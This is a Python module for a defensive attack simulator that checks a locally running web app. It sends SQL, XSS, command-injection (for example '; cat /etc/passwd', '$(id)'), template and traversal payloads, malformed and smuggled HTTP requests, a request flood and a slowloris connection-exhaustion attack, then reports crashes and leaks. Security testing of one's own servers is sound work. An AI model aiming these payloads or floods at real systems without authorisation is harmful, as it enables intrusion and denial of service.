"""Attack simulator: sends what attackers and malware really send to a RUNNING copy of your app,
then checks whether the server crashed, errored, slowed down, leaked information or ran the payload.

Only for servers you own. By default it refuses any host that is not localhost.

Phases (the server is health-checked after each one; a dead server = CRASH):
  1. payloads   - injection, XSS, command, template, traversal, oversized and malformed values
                  sent to every entry point and parameter, plus the harmless EICAR antivirus test file
  2. malformed  - broken HTTP: garbage request lines, huge headers, lying Content-Length, bad JSON
  3. flood      - many requests at once (denial of service)
  4. slowloris  - many half-open connections that never finish (thread exhaustion)
Memory of the server process is sampled before and after when its PID is given.
"""
import json
import os
import re
import socket
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
from concurrent.futures import ThreadPoolExecutor

# The EICAR file is a standard, harmless string that antivirus products detect on purpose.
EICAR = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*"

PAYLOADS = [
    ("sql", "' OR '1'='1' -- "), ("sql", "1; DROP TABLE users; --"), ("sql", "1 UNION SELECT NULL,version()--"),
    ("xss", "<script>alert('sk1')</script>"), ("xss", "<script>alert(1)</script>"), ("xss", "<svg onload=alert(1)>"), ("xss", "\"><img src=x onerror=alert('sk1')>"),
    ("cmd", "; cat /etc/passwd"), ("cmd", "| id"), ("cmd", "$(id)"), ("cmd", "`id`"),
    ("template", "{{'sk7x'*3}}"), ("template", "${'sk7x'.repeat(3)}"), ("template", "<%= 'sk7x'*3 %>"), ("template", "#{'sk7x'*3}"),
    ("traversal", "../../../../../../etc/passwd"), ("traversal", "..%2f..%2f..%2f..%2fetc%2fpasswd"),
    ("traversal", "....//....//....//etc/passwd"), ("nullbyte", "abc%00.txt"),
    ("format", "%s%s%s%s%n%n"), ("number", "-1"), ("number", "99999999999999999999999999"),
    ("number", "1e309"), ("number", "NaN"), ("unicode", "\u202e\u0000\U0001F600" + "\u0301" * 50),
    ("oversize", "A" * 8000), ("eicar", EICAR), ("proto", "__proto__"), ("ldap", "*)(uid=*))(|(uid=*"),
]
JSON_BODIES = [
    ("eicar-json", {"file": EICAR, "name": "eicar.com"}),
    ("proto-pollution", json.loads('{"__proto__": {"isAdmin": true}, "constructor": {"prototype": {"isAdmin": true}}}')),
    ("type-confusion", {"days": ["a"], "id": {"$gt": ""}, "seed": None, "x": True}),
    ("huge-numbers", {"days": 1e308, "cities": -1e308, "seed": 2 ** 70}),
    ("deep-nesting", json.loads("[" * 5000 + "]" * 5000)),
    ("wide-object", {f"k{i}": i for i in range(20000)}),
]
SIGNS = {
    "stack trace leaked": re.compile(r"Traceback \(most recent call last\)|at [\w$.]+ \(.*:\d+:\d+\)|File \"[^\"]+\", line \d+|Exception in thread|SQLSTATE|ORA-\d{5}|syntax error at or near"),
    "file read through traversal": re.compile(r"root:x:0:0:"),
    "command executed": re.compile(r"uid=\d+\(\w+\)"),
    "template executed": re.compile(r"sk7xsk7xsk7x"),
}
LOCAL = {"127.0.0.1", "localhost", "::1", "0.0.0.0"}


class Target:
    def __init__(self, base, health, timeout=10):
        self.base = base.rstrip("/")
        self.health = health
        self.timeout = timeout
        u = urllib.parse.urlsplit(self.base)
        self.host, self.port = u.hostname, u.port or (443 if u.scheme == "https" else 80)

    def request(self, method, path, body=None, headers=None, timeout=None):
        url = path if path.startswith("http") else self.base + path
        data = body if isinstance(body, (bytes, type(None))) else json.dumps(body).encode()
        req = urllib.request.Request(url, data=data, method=method, headers=headers or {})
        if data is not None and "Content-Type" not in (headers or {}):
            req.add_header("Content-Type", "application/json")
        t = time.time()
        try:
            with urllib.request.urlopen(req, timeout=timeout or self.timeout) as r:
                return dict(status=r.status, body=r.read(200_000).decode("utf-8", "replace"),
                            ctype=r.headers.get("Content-Type", ""), secs=time.time() - t)
        except urllib.error.HTTPError as e:
            return dict(status=e.code, body=e.read(200_000).decode("utf-8", "replace"),
                        ctype=e.headers.get("Content-Type", ""), secs=time.time() - t)
        except Exception as e:  # noqa: BLE001 - connection refused, reset, timeout
            return dict(status=0, body="", ctype="", secs=time.time() - t, error=f"{type(e).__name__}: {e}")

    def alive(self, tries=3):
        for _ in range(tries):
            r = self.request("GET", self.health, timeout=8)
            if 200 <= r["status"] < 500:
                return True, r["secs"]
            time.sleep(1)
        return False, None


def rss_mb(pid):
    try:
        for line in open(f"/proc/{pid}/status"):
            if line.startswith("VmRSS"):
                return int(line.split()[1]) / 1024
    except OSError:
        return None


def pid_alive(pid):
    return pid is None or os.path.exists(f"/proc/{pid}")


# ---------------- phase 1: payloads ----------------

def build_requests(endpoints):
    """endpoints: list of dict(method, path, params=[...], json=bool). Path params written as {name}."""
    reqs = []
    for ep in endpoints:
        method, path = ep["method"], ep["path"]
        for kind, p in PAYLOADS:
            q = urllib.parse.quote(p, safe="")
            if "{" in path:
                reqs.append((kind, method, re.sub(r"\{[^}]+\}", q, path), None, p))
            for param in ep.get("params", []):
                sep = "&" if "?" in path else "?"
                base = re.sub(r"\{[^}]+\}", "1", path)
                reqs.append((kind, method, f"{base}{sep}{param}={q}", None, p))
            if ep.get("json"):
                body = {param: p for param in (ep.get("params") or ["value"])}
                reqs.append((kind, method, re.sub(r"\{[^}]+\}", "1", path), body, p))
        if ep.get("json"):
            for kind, body in JSON_BODIES:
                reqs.append((kind, method, re.sub(r"\{[^}]+\}", "1", path), body, EICAR if kind.startswith("eicar") else ""))
    return reqs


def check_response(kind, payload, r, baseline=""):
    found = []
    if r["status"] == 0:
        if "timed out" in r.get("error", ""):
            found.append(("medium", "request timed out (server too slow for this input)", r.get("error", "")))
        else:
            found.append(("high", "connection dropped by the server", r.get("error", "")))
    elif r["status"] >= 500 and r["status"] not in (501, 505):
        found.append(("medium", f"server error {r['status']}", r["body"][:160]))
    for name, rx in SIGNS.items():
        if name == "template executed" and kind != "template":
            continue
        if rx.search(r["body"]) and not rx.search(baseline):
            sev = "high" if name != "stack trace leaked" else "medium"
            found.append((sev, name, rx.search(r["body"]).group(0)[:120]))
    if kind == "xss" and payload in r["body"] and "html" in r["ctype"]:
        found.append(("high", "payload reflected unescaped in an HTML page (XSS)", payload))
    if kind.startswith("eicar") and EICAR in r["body"]:
        found.append(("low", "test-virus content echoed back (no malware scanning on input)", "EICAR string returned"))
    if r["status"] and r["secs"] > 5:
        found.append(("low", "slow response (over 5 s) to one malicious request", f"{r['secs']:.1f}s"))
    return found


def phase_payloads(t, endpoints, workers=2):
    reqs = build_requests(endpoints)
    results = []
    baselines = {}
    for ep in endpoints:
        path = re.sub(r"\{[^}]+\}", "1", ep["path"])
        body = {p: 1 for p in ep.get("params", [])} if ep.get("json") else None
        baselines[(ep["method"], path.split("?")[0])] = t.request(ep["method"], path, body, timeout=60)["body"]

    def run(item):
        kind, method, path, body, payload = item
        r = t.request(method, path, body, timeout=30)
        base = baselines.get((method, path.split("?")[0]), "")
        return item, r, check_response(kind, payload, r, base)

    with ThreadPoolExecutor(workers) as ex:
        for item, r, found in ex.map(run, reqs):
            for sev, what, ev in found:
                results.append(dict(phase="payloads", severity=sev, what=what, attack=item[0],
                                    request=f"{item[1]} {item[2][:120]}" + (" + JSON body" if item[3] is not None else ""),
                                    evidence=ev[:160]))
    return results, len(reqs)


# ---------------- phase 2: malformed HTTP over a raw socket ----------------

def raw(t, data, read=True, timeout=8):
    s = socket.create_connection((t.host, t.port), timeout=timeout)
    try:
        s.sendall(data)
        if not read:
            return b""
        chunks = b""
        try:
            while len(chunks) < 4096:
                c = s.recv(4096)
                if not c:
                    break
                chunks += c
        except socket.timeout:
            pass
        return chunks
    finally:
        s.close()


def phase_malformed(t, post_path):
    h = f"Host: {t.host}\r\n".encode()
    cases = [
        ("garbage request line", b"\x00\xff\xfeGARBAGE \x01\x02\r\n\r\n"),
        ("no HTTP version", b"GET /\r\n\r\n"),
        ("unknown method", b"PWN / HTTP/1.1\r\n" + h + b"\r\n"),
        ("huge header (64 KB)", b"GET / HTTP/1.1\r\n" + h + b"X-Big: " + b"A" * 65536 + b"\r\n\r\n"),
        ("1000 headers", b"GET / HTTP/1.1\r\n" + h + b"".join(f"X-{i}: {i}\r\n".encode() for i in range(1000)) + b"\r\n"),
        ("very long URL (64 KB)", b"GET /" + b"a" * 65536 + b" HTTP/1.1\r\n" + h + b"\r\n"),
        ("negative Content-Length", f"POST {post_path} HTTP/1.1\r\n".encode() + h + b"Content-Length: -5\r\n\r\nabc"),
        ("huge Content-Length, tiny body", f"POST {post_path} HTTP/1.1\r\n".encode() + h + b"Content-Type: application/json\r\nContent-Length: 999999999\r\n\r\n{}"),
        ("conflicting length headers (request smuggling)", f"POST {post_path} HTTP/1.1\r\n".encode() + h +
         b"Content-Length: 4\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\n\r\n"),
        ("broken chunked body", f"POST {post_path} HTTP/1.1\r\n".encode() + h + b"Transfer-Encoding: chunked\r\n\r\nZZZ\r\nxx\r\n"),
        ("invalid UTF-8 JSON", f"POST {post_path} HTTP/1.1\r\n".encode() + h + b"Content-Type: application/json\r\nContent-Length: 6\r\n\r\n{\"\xff\xfe\"}"),
        ("header injection (CRLF in path)", b"GET /%0d%0aSet-Cookie:%20pwned=1 HTTP/1.1\r\n" + h + b"\r\n"),
    ]
    out = []
    for name, data in cases:
        resp = b""
        try:
            resp = raw(t, data)
            status = resp.split(b"\r\n", 1)[0].decode("latin1", "replace")[:60] or "(closed without reply)"
        except Exception as e:  # noqa: BLE001
            status = f"(connection error: {type(e).__name__})"
        resp = resp if isinstance(resp, bytes) else b""
        if b"\r\nSet-Cookie: pwned" in resp:
            out.append(dict(phase="malformed", severity="high", what="CRLF header injection worked", attack=name, request=name, evidence=status))
        if re.search(rb"HTTP/1\.\d 5(?!01|05)\d\d", resp):
            out.append(dict(phase="malformed", severity="medium", what="server error on malformed request", attack=name, request=name, evidence=status))
        if SIGNS["stack trace leaked"].search(resp.decode("latin1")):
            out.append(dict(phase="malformed", severity="medium", what="stack trace leaked", attack=name, request=name, evidence=status))
        ok, _ = t.alive(tries=1)
        if not ok:
            out.append(dict(phase="malformed", severity="critical", what="server stopped answering after this request", attack=name, request=name, evidence=status))
            break
        out.append(dict(phase="malformed", severity="info", what=status, attack=name, request=name, evidence=""))
    return out


# ---------------- phase 3: flood ----------------

def phase_flood(t, paths, concurrency=100, seconds=15):
    stop = time.time() + seconds
    lat, codes, lock = [], {}, threading.Lock()

    def worker(n):
        i = n
        while time.time() < stop:
            method, path, body = paths[i % len(paths)]
            r = t.request(method, path, body, timeout=15)
            with lock:
                lat.append(r["secs"])
                codes[r["status"]] = codes.get(r["status"], 0) + 1
            i += 1

    base_ok, base_secs = t.alive()
    threads = [threading.Thread(target=worker, args=(n,)) for n in range(concurrency)]
    for th in threads:
        th.start()
    time.sleep(seconds / 2)
    mid = t.request("GET", t.health, timeout=15)  # a normal visitor during the flood
    for th in threads:
        th.join()
    lat.sort()
    total = len(lat)
    failed = sum(v for k, v in codes.items() if k == 0 or k >= 500)
    p = lambda q: lat[min(total - 1, int(q * total))] if total else 0  # noqa: E731
    stats = dict(requests=total, per_second=round(total / seconds, 1), failed=failed,
                 failed_pct=round(100 * failed / max(1, total), 1), p50=round(p(0.5), 3), p95=round(p(0.95), 3),
                 max=round(lat[-1], 2) if lat else 0, codes=codes, normal_user_during_flood=round(mid["secs"], 2),
                 normal_user_status=mid["status"], baseline=round(base_secs or 0, 3))
    out = []
    if stats["failed_pct"] > 5:
        out.append(dict(phase="flood", severity="high", what=f"{stats['failed_pct']}% of requests failed under load",
                        attack=f"{concurrency} parallel clients for {seconds}s", request="", evidence=str(codes)))
    if mid["status"] == 0 or mid["secs"] > 5:
        out.append(dict(phase="flood", severity="high", what="a normal visitor could not use the site during the flood",
                        attack="denial of service", request=f"GET {t.health}", evidence=f"{mid['secs']:.1f}s, status {mid['status']}"))
    elif stats["p95"] > 2:
        out.append(dict(phase="flood", severity="medium", what=f"slow under load: 95% of requests took up to {stats['p95']}s",
                        attack="denial of service", request="", evidence=""))
    return out, stats


# ---------------- phase 4: slowloris ----------------

def phase_slowloris(t, sockets=300, hold=20):
    conns = []
    for _ in range(sockets):
        try:
            s = socket.create_connection((t.host, t.port), timeout=4)
            s.sendall(f"GET / HTTP/1.1\r\nHost: {t.host}\r\nX-a: ".encode())
            conns.append(s)
        except OSError:
            break
    opened = len(conns)
    end = time.time() + hold
    worst, failures = 0.0, 0
    while time.time() < end:
        for s in list(conns):
            try:
                s.sendall(b"b\r\nX-a: ")
            except OSError:
                conns.remove(s)
        r = t.request("GET", t.health, timeout=6)
        worst = max(worst, r["secs"])
        failures += r["status"] == 0
        time.sleep(2)
    still_open = len(conns)
    for s in conns:
        try:
            s.close()
        except OSError:
            pass
    stats = dict(opened=opened, still_open_after=still_open, hold_seconds=hold,
                 normal_user_worst_secs=round(worst, 2), normal_user_failures=failures)
    out = []
    if failures:
        out.append(dict(phase="slowloris", severity="high", what=f"site unreachable for normal visitors while {opened} slow connections were open",
                        attack="slowloris", request="", evidence=f"{failures} failed health checks"))
    elif still_open > opened * 0.9:
        out.append(dict(phase="slowloris", severity="low", what="server keeps half-open connections forever (no header timeout)",
                        attack="slowloris", request="", evidence=f"{still_open}/{opened} still open after {hold}s"))
    return out, stats


# ---------------- runner ----------------

def run(base, endpoints, health="/", pid=None, allow_remote=False, flood_clients=100, flood_seconds=15,
        slow_sockets=300, slow_hold=20, log=print):
    t = Target(base, health)
    if t.host not in LOCAL and not allow_remote:
        raise SystemExit(f"Refusing to attack {t.host}: only localhost by default. Use --i-own-this for servers you own.")
    ok, _ = t.alive()
    if not ok:
        raise SystemExit(f"{base}{health} is not answering; start the server first.")
    report = dict(target=base, phases=[], findings=[], memory=[], crashed=False)

    def checkpoint(name):
        mem = rss_mb(pid) if pid else None
        alive, secs = t.alive()
        report["memory"].append((name, mem))
        report["phases"].append(dict(name=name, alive=alive and pid_alive(pid), health_secs=secs, rss_mb=mem))
        if not alive or not pid_alive(pid):
            report["crashed"] = True
            report["findings"].append(dict(phase=name, severity="critical", what="SERVER CRASHED or stopped answering",
                                           attack=name, request="", evidence="health check failed"))
            log(f"  !! server down after {name}")
            return False
        log(f"  ok - server alive after {name}" + (f", memory {mem:.0f} MB" if mem else ""))
        return True

    checkpoint("start")
    log("1/4 payload attacks ...")
    found, n = phase_payloads(t, endpoints)
    report["findings"] += found
    report["payload_requests"] = n
    if checkpoint("payloads"):
        log("2/4 malformed HTTP ...")
        post = next((e["path"] for e in endpoints if e["method"] == "POST"), "/")
        mal = phase_malformed(t, re.sub(r"\{[^}]+\}", "1", post))
        report["malformed"] = [m for m in mal]
        report["findings"] += [m for m in mal if m["severity"] != "info"]
        if checkpoint("malformed") and flood_clients:
            log(f"3/4 flood: {flood_clients} clients for {flood_seconds}s ...")
            paths = [(e["method"], re.sub(r"\{[^}]+\}", "1", e["path"]), {} if e.get("json") else None) for e in endpoints]
            f, stats = phase_flood(t, paths, flood_clients, flood_seconds)
            report["findings"] += f
            report["flood"] = stats
            if checkpoint("flood") and slow_sockets:
                log(f"4/4 slowloris: {slow_sockets} slow connections for {slow_hold}s ...")
                s, sstats = phase_slowloris(t, slow_sockets, slow_hold)
                report["findings"] += s
                report["slowloris"] = sstats
                checkpoint("slowloris")
    mems = [m for _, m in report["memory"] if m]
    if len(mems) >= 2 and mems[-1] - mems[0] > 200:
        report["findings"].append(dict(phase="memory", severity="medium", what=f"memory grew {mems[-1] - mems[0]:.0f} MB during the attack",
                                       attack="resource exhaustion", request="", evidence=f"{mems[0]:.0f} -> {mems[-1]:.0f} MB"))
    return report


def dedupe(findings):
    groups = {}
    for f in findings:
        key = (f["phase"], f["severity"], f["what"], f["attack"])
        g = groups.setdefault(key, dict(f, count=0, examples=[]))
        g["count"] += 1
        if len(g["examples"]) < 3 and f["request"]:
            g["examples"].append(f["request"])
    order = {"critical": 0, "high": 1, "medium": 2, "low": 3}
    return sorted(groups.values(), key=lambda g: order.get(g["severity"], 9))


def to_markdown(rep, name):
    fs = dedupe(rep["findings"])
    verdict = "CRASHED" if rep["crashed"] else "survived every attack phase"
    out = [f"# Attack simulation: {name}", "", f"Target `{rep['target']}` (local copy). Verdict: **{verdict}**.", "",
           "| Phase | Server alive after | Health check | Memory |", "| --- | --- | --- | --- |"]
    for p in rep["phases"]:
        out.append(f"| {p['name']} | {'yes' if p['alive'] else '**NO**'} | {p['health_secs'] and round(p['health_secs'], 3)} s | "
                   f"{'%.0f MB' % p['rss_mb'] if p['rss_mb'] else '-'} |")
    out += ["", f"Payload phase: {rep.get('payload_requests', 0)} malicious requests."]
    if rep.get("flood"):
        f = rep["flood"]
        out += [f"Flood: {f['requests']} requests ({f['per_second']}/s), {f['failed_pct']}% failed, median {f['p50']} s, "
                f"95th percentile {f['p95']} s, slowest {f['max']} s; a normal visitor during the flood waited {f['normal_user_during_flood']} s "
                f"(status {f['normal_user_status']}). Status codes: {f['codes']}."]
    if rep.get("slowloris"):
        s = rep["slowloris"]
        out += [f"Slowloris: {s['opened']} half-open connections held {s['hold_seconds']} s, {s['still_open_after']} still open at the end; "
                f"normal visitor worst wait {s['normal_user_worst_secs']} s, {s['normal_user_failures']} failed checks."]
    out += ["", "## Vulnerabilities found by attacking", ""]
    if not fs:
        out.append("None: no crash, no server error, no leak and no payload execution.")
    else:
        out += ["| Severity | What happened | Attack | Times | Example request | Evidence |", "| --- | --- | --- | --- | --- | --- |"]
        for g in fs:
            ev = g["evidence"].replace("|", "\\|").replace("\n", " ")
            ex = (g["examples"][0] if g["examples"] else "").replace("|", "\\|")
            out.append(f"| {g['severity']} | {g['what']} | {g['attack']} | {g['count']} | `{ex}` | {ev} |")
    if rep.get("malformed"):
        out += ["", "## Malformed request results", "", "| Request | Server reply |", "| --- | --- |"]
        for m in rep["malformed"]:
            if m["severity"] == "info":
                reply = re.sub(r"\s+", " ", m["what"]).replace("|", "\\|")
                if not reply.startswith("HTTP/"):
                    reply = "answered with the home page (treated as an old HTTP/0.9 request)" if "<" in reply else reply
                out.append(f"| {m['attack']} | {reply} |")
    return "\n".join(out) + "\n"


def endpoints_from_project(project):
    """Turn the threat map's entry points into attackable endpoints with their parameters."""
    from . import scan as scanner, threats
    root = os.path.abspath(project)
    files = sorted(scanner.iter_files(root))
    texts = {f: scanner.read_text(root, f) for f in files}
    eps = []
    for e in threats.find_entry_points(root, files, texts):
        if e["kind"] == "html form" or e["path"].startswith("(") or "reuses" in e["kind"]:
            continue
        lines = texts[e["file"]].splitlines()
        chunk = lines[e["line"] - 1:e["line"] + 25]
        end = next((k for k in range(1, len(chunk)) if re.match(r"\s*(@\w+\.(route|get|post|put|patch|delete)\(|(app|router)\.(get|post|put|patch|delete)\()", chunk[k])), len(chunk))
        body = "\n".join(chunk[:end])
        params = sorted(set(re.findall(r"""request\.args\.get\(\s*["'](\w+)""", body) +
                            re.findall(r"""req\.query\.(\w+)""", body) +
                            re.findall(r"""\.get\(\s*["'](\w+)["']\s*,""", body) if e["method"] in ("POST", "PUT", "PATCH") else
                            re.findall(r"""request\.args\.get\(\s*["'](\w+)""", body) + re.findall(r"""req\.query\.(\w+)""", body)))
        path = re.sub(r"<(?:\w+:)?(\w+)>", r"{\1}", e["path"])
        path = re.sub(r"/:(\w+)", r"/{\1}", path)
        for m in e["method"].split(","):
            m = m.strip().upper()
            if m in ("GET", "POST", "PUT", "PATCH", "DELETE"):
                eps.append(dict(method=m, path=path, params=params, json=m in ("POST", "PUT", "PATCH")))
    seen, out = set(), []
    for e in eps:
        k = (e["method"], e["path"])
        if k not in seen:
            seen.add(k)
            out.append(e)
    return out
